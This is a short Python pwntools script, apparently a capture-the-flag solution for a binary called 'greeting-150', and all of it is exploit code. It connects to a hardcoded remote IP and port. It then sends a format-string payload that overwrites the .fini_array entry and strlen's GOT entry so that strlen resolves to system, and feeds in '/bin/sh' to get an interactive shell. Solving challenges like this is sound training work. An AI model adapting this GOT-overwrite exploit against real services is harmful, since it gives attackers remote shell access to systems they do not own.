from pwn import *

context(log_level="debug", arch="i386", os="linux")
elf = ELF("./greeting-150")
# r = process("./greeting-150")
r = remote("111.200.241.244", 56542)
fini_array = 0x8049934

payload = b'BB' + p32(fini_array) + p32(elf.got["strlen"])
payload += "%{}c".format(0xed - len(payload) -  0x12).encode("utf-8") + b"%12$hhn"
payload += "%{}c".format(elf.plt["system"] - 0xed).encode("utf-8") + b"%13$n"
r.recvuntil(b"Please tell me your name... ")
r.sendline(payload)
r.sendline(b"/bin/sh")
r.interactive()